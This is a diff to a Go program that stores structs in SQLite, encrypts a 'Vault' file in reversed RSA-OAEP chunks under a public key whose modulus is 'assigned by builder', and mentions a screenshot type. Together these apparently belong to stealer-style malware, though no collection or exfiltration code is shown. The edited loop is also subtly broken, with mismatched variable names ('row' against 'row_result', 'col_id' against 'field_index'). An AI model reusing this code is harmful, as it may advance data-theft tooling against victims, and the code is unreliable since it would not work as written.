@@ -1,6 +1,7 @@
 package main
 
 import (
+	"bytes"
 	"crypto/rand"
 	"crypto/rsa"
 	"crypto/sha256"
@@ -9,6 +10,7 @@ import (
 	"math/big"
 	"os"
 	"reflect"
+	"slices"
 	"strings"
 
 	_ "github.com/mattn/go-sqlite3"
@@ -20,7 +22,7 @@ var (
 		"[]string": "TEXT",
 		"int":      "INTEGER",
 		"uint64":   "INTEGER",
-		"[]uint8":  "BLOB",
+		"[]uint8":  "BLOB", // Bonus Type for Screenshot object
 	}
 )
 
@@ -37,8 +39,16 @@ type Table struct {
 	rows    [][]interface{}
 }
 
+/*
+headers = {
+	"column_name": "TEXT",
+	"column_name": "TEXT",
+	"column_name": "INTEGER",
+}
+*/
+
 // Convert (most) structs and struct slices to a table, so they can be stored in the database
-/* Alright, quick note from ron.dll
+/* Alright, quick note from rondotdll
  * This code is admittedly a bit of a mess, but just know it works.
  * In order to keep this function from becoming a green soup, I'm going to
  * explain how it works here.
@@ -78,8 +88,10 @@ func ToTable(this interface{}) Table {
 					output.headers[value.Index(0).Type().Field(col_id).Name] = sqlType
 				}
 
-				println(value.Index(row_id).Field(col_id).Interface())
-				row = append(row, value.Index(row_id).Field(col_id).Interface())
+				// used for debugging
+				//println(value.Index(row_id).Field(field_index).Interface())
+
+				row_result = append(row_result, value.Index(row_id).Field(field_index).Interface())
 			}
 			output.rows = append(output.rows, row)
 		}
@@ -169,23 +181,52 @@ func (this *Vault) Sign() *Vault {
 	// placeholder for RSA Big Int (assigned by builder)
 	var rsa_n = big.NewInt(__BIGINT_x64)
 
-	// placeholder for public key (assigned by builder)
+	// placeholder for public key
 	key := rsa.PublicKey{
-		N: rsa_n,
-		E: __RSA_E,
+		N: rsa_n,   // Modulus
+		E: 0x10001, // Exponent [Default]
 	}
 
 	// Encrypt the raw using the public key
-	ciphertext, _ := rsa.EncryptOAEP(
-		sha256.New(),
-		rand.Reader,
-		&key,
+	cipherSlice, _ := chunkAndEncryptOAEP(
 		raw,
-		nil,
+		&key,
 	)
+
+	slices.Reverse(cipherSlice)
+
+	ciphertext := bytes.Join(cipherSlice, []byte(""))
 
 	// Write the encrypted ciphertext to the output file
 	os.WriteFile(this.location, ciphertext, 0644)
 
 	return this
+}
+
+// paste it here
+func chunkAndEncryptOAEP(message []byte, pub *rsa.PublicKey) ([][]byte, error) {
+	chunkSize := pub.Size() - 2*sha256.Size
+	chunks := make([][]byte, 0, (len(message)+chunkSize-1)/chunkSize)
+
+	for len(message) > chunkSize {
+		chunk := message[:chunkSize]  // the first `chunkSize` bytes
+		message = message[chunkSize:] // everything after `chunkSize` bytes
+
+		encryptedChunk, err := rsa.EncryptOAEP(sha256.New(), rand.Reader, pub, chunk, nil)
+		if err != nil {
+			return nil, err
+		}
+		chunks = append(chunks, encryptedChunk)
+	}
+
+	// Encrypt the final chunk
+	if len(message) > 0 {
+		encryptedChunk, err := rsa.EncryptOAEP(sha256.New(), rand.Reader, pub, message, nil)
+		if err != nil {
+			return nil, err
+		}
+		chunks = append(chunks, encryptedChunk)
+	}
+
+	return chunks, nil
 }
